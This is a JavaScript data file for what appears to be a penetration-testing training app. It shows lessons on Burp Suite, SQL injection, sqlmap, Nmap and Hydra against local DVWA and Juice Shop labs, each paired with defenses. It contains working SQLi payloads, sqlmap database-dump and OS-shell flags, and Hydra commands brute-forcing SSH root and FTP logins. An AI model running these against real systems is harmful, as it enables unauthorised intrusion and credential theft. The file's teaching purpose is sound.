/* ═══════════════════════════════════════════════════════════════════════════════
   CyberCompanion — Renderer v1.1
   5 Modules · Docker Wizard · Defense Sections · Copy Buttons
   ═══════════════════════════════════════════════════════════════════════════════ */

// ─── SVG Icons ──────────────────────────────────────────────────────────────────
const ICONS = {
  copy:     `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>`,
  check:    `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>`,
  concept:  `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>`,
  analogy:  `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><circle cx="12" cy="12" r="10"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>`,
  exercise: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>`,
  reference:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>`,
  defense:  `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>`,
  error:    `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>`,
  docker:   `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>`,
  shield:   `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>`
};

/* ═══════════════════════════════════════════════════════════════════════════════
   MODULE DATA
   ═══════════════════════════════════════════════════════════════════════════════ */

const MODULES = [

// ─────────────────────────────────────────────────────────────────────────────
// MODULE 1: Burp Suite Proxy Interception
// ─────────────────────────────────────────────────────────────────────────────
{
  id: 'burp-proxy', num: '01',
  title: 'Burp Suite Proxy Interception',
  subtitle: 'Learn how web proxies capture, inspect, and modify HTTP traffic between your browser and a target application.',
  tag: 'Module 1 — Proxy Fundamentals',

  concept: [
    `Every time you visit a website, your browser sends an <strong>HTTP request</strong> to a server, which replies with an <strong>HTTP response</strong>. Normally this exchange is invisible — it happens in milliseconds behind the scenes.`,
    `A <strong>web proxy</strong> is software that sits <em>between</em> your browser and the server. It intercepts every request and response, letting you read, modify, or replay them before they reach their destination.`,
    `<strong>Burp Suite</strong> is the industry-standard web proxy for penetration testers. When you enable its <strong>Intercept</strong> feature, every outbound request from Burp's built-in Chromium browser is paused and displayed in a raw text editor. You can change parameters, headers, or the body — then forward the modified request to the server.`,
    `This gives you complete control over the conversation between client and server, which is the foundation of almost every web application attack.`
  ],

  analogy: { emoji: '📬', text: `Imagine a postal inspector stationed at a sorting facility. Every letter (HTTP request) leaving your house passes through the inspector's desk. They can open the envelope, read the contents, change the delivery address, swap the letter inside, or simply let it pass through. The recipient (server) has no idea the letter was ever touched. That inspector is your Burp Suite proxy.` },

  steps: [
    { title: 'Start Burp Suite and Open the Built-in Browser', desc: 'Launch Burp Suite Community Edition. Navigate to the <strong>Proxy</strong> tab and click <strong>"Open browser"</strong>. This opens a Chromium instance pre-configured to route all traffic through Burp — no manual proxy settings needed.', code: null },
    { title: 'Enable Intercept Mode', desc: 'In the <strong>Proxy → Intercept</strong> sub-tab, click the toggle so it reads <strong>"Intercept is on"</strong>. From this moment, every HTTP request from the built-in browser will be paused and shown to you.', code: null },
    { title: 'Browse to the Juice Shop Target', desc: 'In Burp\'s built-in browser, navigate to the local Juice Shop instance. The page will appear to hang because Burp is holding the request.', code: { lang: 'url', text: 'http://localhost:3000' } },
    { title: 'Inspect the Intercepted Request', desc: 'Switch back to the Burp window. You\'ll see the raw GET request in the Intercept panel. Study the structure — the request line, Host header, User-Agent, cookies, and any query parameters.', code: { lang: 'http', text: 'GET / HTTP/1.1\nHost: localhost:3000\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nAccept: text/html,application/xhtml+xml\nAccept-Language: en-US,en;q=0.9\nConnection: keep-alive' } },
    { title: 'Forward and Observe the Response', desc: 'Click <strong>"Forward"</strong> in Burp to send the request to the server. The Juice Shop homepage will now load. Check the <strong>HTTP history</strong> sub-tab to see both the request and the server\'s response, including status code, headers, and body.', code: null },
    { title: 'Modify a Request In-Flight', desc: 'Navigate to the Juice Shop login page. When Burp intercepts the POST request, change a parameter value directly in the raw editor before forwarding it. This is the core skill you\'ll use in every subsequent module.', code: { lang: 'http', text: 'POST /rest/user/login HTTP/1.1\nHost: localhost:3000\nContent-Type: application/json\n\n{"email":"test@test.com","password":"modified_value"}' } },
    { title: 'Abusing Client-Side Validation', desc: 'A common vulnerability is relying solely on the browser (client) for security checks. In Juice Shop, try giving a product a negative quantity or an unrealistic price. The browser UI might prevent you from typing "-1", but you can intercept the API request in Burp and change the quantity to a negative number before it hits the server.', code: { lang: 'json', text: '{"ProductId": 1, "quantity": -10}' } },
    { title: 'Discover the Hidden Score Board', desc: 'Juice Shop has a hidden "Score Board" tracking your hacking progress. The link is hidden in the UI, but by intercepting the main JavaScript bundle request and looking at the response (or using Repeater), you can find the path. Then simply browse to it.', code: { lang: 'url', text: 'http://localhost:3000/#/score-board' } },
    { title: 'Using Burp Repeater', desc: 'Find any request in your <strong>HTTP history</strong>, right-click, and select <strong>Send to Repeater</strong>. Repeater allows you to replay the exact same request hundreds of times, tweaking one parameter at a time and instantly seeing the response without clicking through the UI again.', code: null }
  ],

  defense: [
    { title: 'HTTPS / TLS Encryption', desc: 'Encrypt all traffic with TLS certificates. Even if intercepted on the network, the data is unreadable without the private key. Always redirect HTTP to HTTPS.' },
    { title: 'HTTP Strict Transport Security (HSTS)', desc: 'Set the <code>Strict-Transport-Security</code> header so browsers refuse to connect over plain HTTP after the first visit.' },
    { title: 'Certificate Pinning', desc: 'Mobile apps can pin the server\'s exact certificate, rejecting proxy certificates like Burp\'s. This prevents MITM on production mobile traffic.' },
    { title: 'Input Validation on the Server', desc: 'Never trust client-side data. Validate and sanitize every parameter on the server — a proxy can bypass any client-side checks (like min/max length, regex, or dropdown restrictions).' }
  ],

  payloads: { headers: ['Item', 'Description', 'Example'], rows: [
    ['GET',           'Retrieves a resource from the server',                      'GET /api/users HTTP/1.1'],
    ['POST',          'Sends data to the server (login forms, file uploads)',       'POST /rest/user/login HTTP/1.1'],
    ['PUT',           'Replaces an entire resource on the server',                 'PUT /api/users/1 HTTP/1.1'],
    ['DELETE',        'Removes a resource from the server',                        'DELETE /api/users/1 HTTP/1.1'],
    ['Host',          'Header specifying the target domain',                       'Host: localhost:3000'],
    ['Cookie',        'Header carrying session tokens',                            'Cookie: token=abc123'],
    ['Content-Type',  'Header declaring the format of the request body',           'Content-Type: application/json'],
    ['Authorization', 'Header carrying credentials (Basic, Bearer, etc.)',         'Authorization: Bearer eyJhb...'],
    ['200 OK',        'Server processed the request successfully',                 'HTTP/1.1 200 OK'],
    ['301 Redirect',  'Resource moved permanently to another URL',                 'HTTP/1.1 301 Moved Permanently'],
    ['403 Forbidden', 'Server refuses to authorize the request',                   'HTTP/1.1 403 Forbidden'],
    ['500 Server Error','Unexpected error on the server side',                     'HTTP/1.1 500 Internal Server Error']
  ]}
},

// ─────────────────────────────────────────────────────────────────────────────
// MODULE 2: SQL Injection (SQLi)
// ─────────────────────────────────────────────────────────────────────────────
{
  id: 'sqli', num: '02',
  title: 'SQL Injection (SQLi)',
  subtitle: 'Understand how unsanitized user input can manipulate backend database queries to leak data or bypass authentication.',
  tag: 'Module 2 — Database Exploitation',

  concept: [
    `Most web applications store data in a <strong>relational database</strong> (MySQL, PostgreSQL, SQLite). When you submit a form — like a login or search box — the application builds an <strong>SQL query</strong> using your input.`,
    `For example, a login form might produce: <code>SELECT * FROM users WHERE username = 'your_input' AND password = 'your_password'</code>. If the developer concatenates your input directly into the query without sanitizing it, you can inject your own SQL syntax.`,
    `By inserting a carefully crafted string like <code>' OR '1'='1</code>, you change the query's logic so it always returns true — effectively bypassing the password check and returning all rows.`,
    `SQL Injection can lead to <strong>complete database compromise</strong>: reading all user records, extracting password hashes, modifying data, or even executing OS commands through database functions like <code>xp_cmdshell</code>.`
  ],

  analogy: { emoji: '🏦', text: `Imagine walking into a bank and handing the teller a withdrawal slip. Normally you write your account number and amount. But what if the teller blindly reads whatever you write? You could write: "Withdraw $100 from account #1234 OR just give me everything from every account." Because the teller doesn't validate the slip, they hand over the entire vault. That's SQL Injection.` },

  steps: [
    { title: 'Open DVWA and Set Security Level', desc: 'Navigate to the local DVWA instance in Burp\'s built-in browser. Log in with the default credentials. Then go to <strong>DVWA Security</strong> and set the level to <strong>Low</strong>.', code: { lang: 'text', text: 'URL:      http://localhost:8080\nUsername: admin\nPassword: password' } },
    { title: 'Test Normal Input in DVWA', desc: 'Go to "SQL Injection". Enter <code>1</code> in the User ID field and click Submit. The application returns user information for ID 1, confirming the form is connected to a live database.', code: { lang: 'sql', text: "-- What the server executes internally:\nSELECT first_name, last_name FROM users WHERE user_id = '1';" } },
    { title: 'Inject a Tautology Payload (DVWA)', desc: 'Now enter the classic SQLi tautology payload. This modifies the WHERE clause so it always evaluates to TRUE, causing the database to dump all records.', code: { lang: 'text', text: "1' OR '1'='1" } },
    { title: 'Juice Shop Admin Bypass', desc: 'Now let\'s try a modern app. Open Juice Shop (http://localhost:3000) and go to the login page. In the email field, input the administrator email followed by a SQL comment. Put anything in the password field.', code: { lang: 'text', text: "Email: admin@juice-sh.op' --\nPassword: a" } },
    { title: 'Understand the Juice Shop Bypass', desc: 'By adding the comment characters (`--`), you tell the SQLite database engine to ignore the rest of the query. The password check is never executed!', code: { lang: 'sql', text: "-- Internal Query becomes:\nSELECT * FROM Users WHERE email = 'admin@juice-sh.op' --' AND password = 'a';" } },
    { title: 'Error-Based SQLi', desc: 'Sometimes you don\'t get a clean dump, but the server spits out database errors. Try placing a single quote (`\'`) into the Juice Shop search bar or a product review. If the page returns a stack trace mentioning "SQLITE_ERROR", you have confirmed it is vulnerable.', code: { lang: 'text', text: "Search: apple'" } },
    { title: 'Extract Database Version with UNION SELECT', desc: 'Back in DVWA, use a UNION-based injection to extract the database version. First determine the column count (DVWA uses 2 columns), then inject:', code: { lang: 'text', text: "1' UNION SELECT user(), version()-- -" } },
    { title: 'Enumerate All Tables', desc: 'Once you know the column count, you can enumerate every table in the database by querying <code>information_schema</code>:', code: { lang: 'text', text: "1' UNION SELECT table_name, table_schema FROM information_schema.tables-- -" } },
    { title: 'Extract Passwords', desc: 'Now target the users table to extract password hashes. These can later be cracked offline with tools like John the Ripper or hashcat:', code: { lang: 'text', text: "1' UNION SELECT user, password FROM users-- -" } }
  ],

  defense: [
    { title: 'Parameterized Queries / Prepared Statements', desc: 'The #1 defense. Use placeholders (<code>?</code> or <code>:name</code>) instead of string concatenation. The database driver treats user input as data, never as SQL syntax. Example in PHP: <code>$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?"); $stmt->execute([$id]);</code>' },
    { title: 'Input Validation & Whitelisting', desc: 'If a field should be a number, cast it to an integer. If it\'s a name, allow only alphanumeric characters. Reject anything that doesn\'t match the expected pattern.' },
    { title: 'Least-Privilege Database Accounts', desc: 'The web application\'s database user should have only SELECT/INSERT/UPDATE on the tables it needs — never DBA or root privileges. This limits the damage even if SQLi succeeds.' },
    { title: 'Web Application Firewall (WAF)', desc: 'Deploy a WAF (e.g., ModSecurity) to detect and block common SQLi patterns in real time. Not a replacement for secure code, but a valuable layer of defense.' },
    { title: 'Generic Error Handling', desc: 'Never expose raw database errors to the user. Use generic error pages. Detailed SQL error messages reveal table names, column types, and query structure to attackers.' }
  ],

  payloads: { headers: ['Payload', 'Purpose', 'Risk'], rows: [
    ["' OR '1'='1",                          'Tautology — bypasses WHERE clause, returns all rows',       'High'],
    ["' OR '1'='1'-- -",                     'Tautology with comment — ignores remaining SQL',            'High'],
    ["' UNION SELECT null,null-- -",         'Column count detection for UNION-based injection',           'Medium'],
    ["' UNION SELECT user(),version()-- -",  'Extracts current DB user and version string',               'High'],
    ["' UNION SELECT table_name,null FROM information_schema.tables-- -", 'Enumerates all table names',   'High'],
    ["' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'-- -", 'Extracts column names from target table', 'High'],
    ["' AND 1=1-- -",                        'Boolean-based blind test — page normal if true',             'Medium'],
    ["' AND 1=2-- -",                        'Boolean-based blind test — page changes if false',           'Medium'],
    ["' AND SLEEP(5)-- -",                   'Time-based blind test — delays response by 5 seconds',       'Medium'],
    ["admin@juice-sh.op'--",                 'Juice Shop Auth bypass — SQLite comment syntax',             'High'],
    ["id=1'+OR+'1'='1&Submit=Submit",        'URL-encoded tautology for Burp Repeater (DVWA)',             'High']
  ]}
},

// ─────────────────────────────────────────────────────────────────────────────
// MODULE 3: SQLmap — Automated SQL Injection
// ─────────────────────────────────────────────────────────────────────────────
{
  id: 'sqlmap', num: '03',
  title: 'SQLmap — Automated SQL Injection',
  subtitle: 'After understanding manual SQLi, learn how SQLmap automates detection, exploitation, and full database extraction.',
  tag: 'Module 3 — Automation & Tooling',

  concept: [
    `<strong>SQLmap</strong> is an open-source penetration testing tool that automates the entire SQL Injection lifecycle — detection, exploitation, and data extraction. It is pre-installed on Kali Linux.`,
    `It supports all major injection techniques: <strong>boolean-based blind</strong>, <strong>time-based blind</strong>, <strong>error-based</strong>, <strong>UNION-based</strong>, and <strong>stacked queries</strong>. SQLmap automatically fingerprints the database engine (MySQL, PostgreSQL, MSSQL, Oracle, SQLite) and adjusts its payloads accordingly.`,
    `<strong>Why use it after learning manual SQLi?</strong> Manual injection teaches you the underlying mechanics — you understand <em>why</em> things work. SQLmap then lets you scale that knowledge efficiently: it tests hundreds of payloads in seconds, handles encoding/escaping edge cases, and can dump entire databases automatically.`,
    `SQLmap can also read/write files on the server filesystem, execute OS commands (if the DB user has sufficient privileges), and even spawn an interactive shell — making it one of the most powerful tools in a pentester's toolkit.`
  ],

  analogy: { emoji: '🤖', text: `You've just learned to pick a single lock by hand — you understand how the pins work, how tension wrenches apply pressure, and how to feel for the click. SQLmap is like a robotic lockpicking machine that can test every pin combination across every lock in the building in minutes. It uses the same techniques you learned by hand, but at machine speed. You still need to understand the fundamentals to interpret results and troubleshoot failures.` },

  steps: [
    { title: 'Identify the Target URL', desc: 'First, use Burp Suite (Module 1) to identify a URL with a parameter you suspect is vulnerable. For DVWA\'s SQLi page, the URL looks like this:', code: { lang: 'text', text: 'http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit' } },
    { title: 'Run a Basic SQLmap Scan (DVWA)', desc: 'Open a terminal in Kali Linux. Pass the target URL to SQLmap with the <code>-u</code> flag. Include the session cookie so SQLmap is authenticated. SQLmap will test the <code>id</code> parameter for injection vulnerabilities.', code: { lang: 'bash', text: 'sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \\\n  --cookie="PHPSESSID=your_session_id; security=low"' } },
    { title: 'Automating JSON APIs (Juice Shop)', desc: 'Juice Shop uses JSON payloads, not standard form fields. Using `-u` is tedious for JSON. Instead, intercept the login request in Burp Suite, right-click, and select "Save item" as `request.txt`.', code: { lang: 'http', text: 'POST /rest/user/login HTTP/1.1\nHost: localhost:3000\nContent-Type: application/json\n\n{"email":"test@test.com","password":"test"}' } },
    { title: 'Run SQLmap with a Burp Request', desc: 'Use the `-r` flag to point SQLmap to the saved file. SQLmap will automatically parse the headers, URL, and the JSON body, and start testing every JSON value.', code: { lang: 'bash', text: 'sqlmap -r request.txt --batch' } },
    { title: 'Enumerate All Databases', desc: 'Once SQLmap confirms the injection point, use <code>--dbs</code> to list every database on the server:', code: { lang: 'bash', text: 'sqlmap -r request.txt --dbs' } },
    { title: 'Enumerate Tables in a Database', desc: 'Pick a database from the results (e.g., <code>dvwa</code> or SQLite for Juice Shop) and list all its tables with <code>-D</code> and <code>--tables</code>:', code: { lang: 'bash', text: 'sqlmap -r request.txt -D dvwa --tables' } },
    { title: 'Dump the Data', desc: 'Extract the actual data from the columns you care about. SQLmap will even attempt to crack password hashes automatically using a dictionary attack:', code: { lang: 'bash', text: 'sqlmap -r request.txt -D dvwa -T users -C user,password --dump' } },
    { title: 'Using Tamper Scripts', desc: 'Web Application Firewalls (WAFs) often block basic SQLi syntax (like blocking spaces). SQLmap has "tamper scripts" to obfuscate payloads. Use `--tamper=space2comment` to replace spaces with `/**/` comments to bypass basic WAFs.', code: { lang: 'bash', text: 'sqlmap -r request.txt --tamper=space2comment --level=3 --risk=2' } }
  ],

  defense: [
    { title: 'Same Defenses as Manual SQLi', desc: 'All defenses from Module 2 apply — parameterized queries, input validation, least-privilege DB accounts, and WAFs are your primary protections.' },
    { title: 'Rate Limiting', desc: 'SQLmap sends many rapid requests. Rate limiting and anomaly detection can flag or block automated scanning patterns.' },
    { title: 'Intrusion Detection Systems (IDS)', desc: 'Tools like Snort or Suricata can detect SQLmap\'s signature patterns (user-agent strings, payload patterns) and alert security teams.' },
    { title: 'Disable Detailed Error Messages', desc: 'Error-based SQLi relies on the server exposing database errors. Configure the application to show generic error pages in production.' }
  ],

  payloads: { headers: ['Flag', 'Purpose', 'Example'], rows: [
    ['-u URL',         'Target URL with injectable parameter',              'sqlmap -u "http://target/page?id=1"'],
    ['-r FILE',        'Use a saved HTTP request file from Burp Suite',     'sqlmap -r request.txt'],
    ['--dbs',          'Enumerate all databases on the server',             'sqlmap -u URL --dbs'],
    ['-D DB --tables', 'List all tables in a specific database',            'sqlmap -u URL -D dvwa --tables'],
    ['-T TBL --columns','List columns in a specific table',                 'sqlmap -u URL -D dvwa -T users --columns'],
    ['--dump',         'Extract (dump) data from specified table/columns',  'sqlmap -u URL -D dvwa -T users --dump'],
    ['--batch',        'Non-interactive mode (auto-answers all prompts)',   'sqlmap -r req.txt --batch'],
    ['--level=N',      'Test thoroughness (1-5). Higher = more params',    'sqlmap -u URL --level=5'],
    ['--risk=N',       'Payload aggressiveness (1-3). Higher = riskier',   'sqlmap -u URL --risk=3'],
    ['--forms',        'Auto-detect and test HTML forms on a page',        'sqlmap -u "http://target/login" --forms'],
    ['--os-shell',     'Attempt to spawn an interactive OS shell',          'sqlmap -u URL --os-shell'],
    ['--cookie=C',     'Set HTTP Cookie header for authentication',         'sqlmap -u URL --cookie="PHPSESSID=abc"'],
    ['--threads=N',    'Parallelise requests (default 1, max 10)',         'sqlmap -u URL --threads=10'],
    ['--tamper=SCRIPT','Apply payload tampering scripts to bypass WAFs',    'sqlmap -u URL --tamper=space2comment']
  ]}
},

// ─────────────────────────────────────────────────────────────────────────────
// MODULE 4: Nmap — Network Scanning & Enumeration
// ─────────────────────────────────────────────────────────────────────────────
{
  id: 'nmap', num: '04',
  title: 'Nmap — Network Scanning & Enumeration',
  subtitle: 'Master the most widely-used network scanner. Learn every major flag and scan technique for discovering hosts, open ports, and running services.',
  tag: 'Module 4 — Reconnaissance',

  concept: [
    `<strong>Nmap (Network Mapper)</strong> is the de facto standard tool for network discovery and security auditing. It is pre-installed on Kali Linux and available for all major operating systems.`,
    `At its core, Nmap sends specially crafted packets to target hosts and analyses the responses to determine: which <strong>hosts are alive</strong> on a network, which <strong>ports are open</strong>, what <strong>services and versions</strong> are running on those ports, and what <strong>operating system</strong> the target is using.`,
    `Nmap supports dozens of scan types, from stealthy SYN scans that never complete a TCP handshake, to aggressive scans that fingerprint every service and run vulnerability detection scripts. The <strong>Nmap Scripting Engine (NSE)</strong> extends Nmap with hundreds of scripts for tasks like brute-forcing, vulnerability scanning, and even exploitation.`,
    `Understanding Nmap's flags is critical — each flag changes the scan behavior significantly. This module walks through every major flag group with practical examples.`
  ],

  analogy: { emoji: '🔦', text: `Imagine you're a security guard who just started a night shift at a massive office building. You need to check every floor and every door. A basic walk-through (ping scan) tells you which floors have lights on — i.e., which hosts are alive. Trying each door handle (port scan) tells you which rooms are unlocked. Peeking inside open rooms (version detection) tells you what equipment is inside. Reading the nameplates (OS detection) tells you who occupies each floor. Nmap is your all-in-one flashlight, master key, and notebook.` },

  steps: [
    { title: 'Scan your Docker Containers', desc: 'First, find out what ports are open on localhost. Nmap can scan your own machine to find the lab containers (Juice Shop on 3000, DVWA on 8080). Use `-p-` to scan all 65,535 ports.', code: { lang: 'bash', text: 'nmap -p- 127.0.0.1' } },
    { title: 'Service Version Detection', desc: 'The <code>-sV</code> flag probes open ports to determine the exact service name and version. Let\'s see what\'s running on ports 3000 and 8080.', code: { lang: 'bash', text: 'nmap -sV -p 3000,8080 127.0.0.1' } },
    { title: 'SYN Scan (Stealth Scan)', desc: 'The <code>-sS</code> flag performs a SYN scan — Nmap sends a SYN packet and waits for a SYN/ACK (open) or RST (closed) without completing the handshake. This is faster and stealthier than a full connect scan. Requires root/sudo privileges:', code: { lang: 'bash', text: 'sudo nmap -sS 192.168.1.1' } },
    { title: 'Aggressive Scan', desc: 'The <code>-A</code> flag combines OS detection, version detection, script scanning, and traceroute in a single command. This is the most information-rich scan but also the most detectable.', code: { lang: 'bash', text: 'sudo nmap -A 127.0.0.1' } },
    { title: 'NSE Script Scanning: HTTP Enum', desc: 'The Nmap Scripting Engine (NSE) runs Lua scripts. Use the `http-enum` script to automatically search the target web server for common directories, hidden admin panels, and known vulnerabilities.', code: { lang: 'bash', text: 'nmap -p 8080 --script http-enum 127.0.0.1' } },
    { title: 'NSE Script Scanning: HTTP Title', desc: 'Use the `http-title` script to quickly extract the `<title>` tag of the website on port 3000 without opening a browser. It will reveal "OWASP Juice Shop".', code: { lang: 'bash', text: 'nmap -p 3000 --script http-title 127.0.0.1' } },
    { title: 'Timing Templates', desc: 'Control scan speed with <code>-T</code> (0–5). Lower values are slower but stealthier. Higher values are faster but noisier. <code>-T4</code> is recommended for fast local scanning.', code: { lang: 'bash', text: 'nmap -T4 -p- 127.0.0.1' } },
    { title: 'Save Output to Files', desc: 'Always save scan results. Nmap supports multiple output formats. Using `-oA` saves it in normal, XML, and grepable formats simultaneously.', code: { lang: 'bash', text: 'nmap -sV -p 3000,8080 -oA lab_scan 127.0.0.1' } },
    { title: 'Scan an Entire Subnet', desc: 'In a real pentest, you scan whole networks. Use CIDR notation (e.g. `/24`) combined with <code>-sn</code> for a fast ping sweep to find live hosts before running port scans:', code: { lang: 'bash', text: 'nmap -sn 192.168.1.0/24' } }
  ],

  defense: [
    { title: 'Firewall Rules (iptables / Windows Firewall)', desc: 'Block or rate-limit incoming probe packets. Only expose ports that must be publicly accessible. Drop packets to unused ports silently (don\'t reject — rejecting confirms the host is alive).' },
    { title: 'Close Unnecessary Ports', desc: 'Every open port is a potential attack surface. Disable services you don\'t need. Run <code>ss -tlnp</code> or <code>netstat -tlnp</code> regularly to audit listening services.' },
    { title: 'Intrusion Detection / Prevention Systems', desc: 'Deploy IDS/IPS (Snort, Suricata) to detect Nmap scan patterns. Many can distinguish between SYN scans, OS fingerprinting, and NSE script traffic.' },
    { title: 'Banner Obfuscation', desc: 'Modify service banners to hide version information. For example, configure Apache to show "Server: " with no version string. This doesn\'t fix vulnerabilities but slows down attackers.' }
  ],

  payloads: { headers: ['Flag', 'Purpose', 'Example'], rows: [
    ['-sS',          'TCP SYN scan (stealth, default with root)',       'sudo nmap -sS target'],
    ['-sT',          'TCP Connect scan (no root needed)',               'nmap -sT target'],
    ['-sU',          'UDP port scan',                                    'sudo nmap -sU target'],
    ['-sV',          'Service/version detection on open ports',          'nmap -sV target'],
    ['-O',           'OS fingerprinting / detection',                    'sudo nmap -O target'],
    ['-A',           'Aggressive (OS + version + scripts + traceroute)','sudo nmap -A target'],
    ['-sC',          'Default NSE script scan',                          'nmap -sC target'],
    ['--script X',   'Run specific NSE script(s) or categories',         'nmap --script http-enum target'],
    ['-p PORTS',     'Scan specific ports or ranges',                    'nmap -p 22,80,443 target'],
    ['-p-',          'Scan ALL 65535 ports',                              'nmap -p- target'],
    ['--top-ports N','Scan the N most common ports',                     'nmap --top-ports 200 target'],
    ['-Pn',          'Skip host discovery (treat host as up)',           'nmap -Pn target'],
    ['-sn',          'Ping sweep only (no port scan)',                   'nmap -sn 192.168.1.0/24'],
    ['-T0 to -T5',   'Timing template (0=paranoid, 5=insane)',          'nmap -T4 target'],
    ['-oN FILE',     'Output in normal text format',                     'nmap -oN results.txt target'],
    ['-oA BASE',     'Output in all formats (normal, XML, grepable)',   'nmap -oA results target'],
    ['-v / -vv',     'Increase output verbosity',                        'nmap -vv target'],
    ['--open',       'Show only open ports in output',                   'nmap --open target']
  ]}
},

// ─────────────────────────────────────────────────────────────────────────────
// MODULE 5: Brute Force with Hydra
// ─────────────────────────────────────────────────────────────────────────────
{
  id: 'hydra', num: '05',
  title: 'Brute Force Attacks with Hydra',
  subtitle: 'Learn how password guessing attacks work, how to use Hydra for HTTP, SSH, and FTP brute forcing, and how to defend against them.',
  tag: 'Module 5 — Credential Attacks',

  concept: [
    `<strong>Brute force attacks</strong> are a category of attacks where the attacker systematically tries every possible combination of credentials until finding the correct one. In practice, attackers don't try truly random combinations — they use <strong>wordlists</strong> (dictionaries of common passwords and usernames).`,
    `<strong>Hydra</strong> (also called THC-Hydra) is a fast, parallelised network login cracker pre-installed on Kali Linux. It supports over 50 protocols including HTTP, HTTPS, SSH, FTP, MySQL, RDP, SMB, and many more. It can test thousands of username/password combinations per minute.`,
    `The basic concept is simple: Hydra takes a <strong>target</strong> (IP + port), a <strong>protocol</strong> (SSH, HTTP-form, FTP, etc.), a <strong>username or username list</strong>, and a <strong>password or password list</strong>. It then tries every combination, watching for successful logins.`,
    `<strong>Wordlists</strong> are critical. Kali Linux ships with several built-in wordlists in <code>/usr/share/wordlists/</code>. The most famous is <code>rockyou.txt</code> (14 million leaked passwords). You can also generate custom wordlists with tools like <code>crunch</code> or <code>cewl</code> (which scrapes words from a target website).`
  ],

  analogy: { emoji: '🔑', text: `Imagine you're locked out of your house and you have a massive keyring with 10,000 keys. You try each key one by one until the door opens. A brute force attack works the same way — except Hydra can try hundreds of "keys" (passwords) per second across the network. The bigger and smarter your keyring (wordlist), the faster you'll find the right key. Strong, unique passwords are like having a lock that requires a key shape none of those 10,000 keys match.` },

  steps: [
    { title: 'Locate Wordlists on Kali', desc: 'Kali Linux ships with wordlists in <code>/usr/share/wordlists/</code>. The most important one is <code>rockyou.txt</code>, which may need to be unzipped first:', code: { lang: 'bash', text: '# List available wordlists:\nls /usr/share/wordlists/\n\n# Unzip rockyou.txt if needed:\nsudo gunzip /usr/share/wordlists/rockyou.txt.gz\n\n# Check word count:\nwc -l /usr/share/wordlists/rockyou.txt\n# Output: 14344392 (14+ million passwords)' } },
    { title: 'Brute Force DVWA Login (Standard HTML Form)', desc: 'DVWA uses a traditional HTML POST form. You need three things: the login URL, the form field names, and the error message for failed logins. The <code>http-post-form</code> module handles this syntax.', code: { lang: 'bash', text: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt \\\n  localhost -s 8080 \\\n  http-post-form \\\n  "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"' } },
    { title: 'Brute Force Juice Shop (JSON API)', desc: 'Juice Shop is a modern app that uses JSON APIs instead of standard forms. Hydra supports JSON POST data directly. Note how the colon syntax is used to pass the JSON string and the "Invalid email or password" failure string.', code: { lang: 'bash', text: 'hydra -l admin@juice-sh.op -P /usr/share/wordlists/rockyou.txt \\\n  localhost -s 3000 \\\n  http-post-form \\\n  "/rest/user/login:{\\"email\\":\\"^USER^\\",\\"password\\":\\"^PASS^\\"}:Invalid email or password:H=Content-Type: application/json"' } },
    { title: 'Brute Force SSH', desc: 'SSH brute forcing is straightforward — just specify the target IP and protocol. Use <code>-t</code> to limit parallel threads (SSH servers often limit concurrent connections):', code: { lang: 'bash', text: '# Single username, password list:\nhydra -l root -P /usr/share/wordlists/rockyou.txt \\\n  ssh://192.168.1.1 -t 4\n\n# Username list + password list:\nhydra -L users.txt -P /usr/share/wordlists/rockyou.txt \\\n  ssh://192.168.1.1 -t 4' } },
    { title: 'Brute Force FTP', desc: 'FTP is another common target, especially on older systems. The syntax is identical — just change the protocol:', code: { lang: 'bash', text: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt \\\n  ftp://192.168.1.1' } },
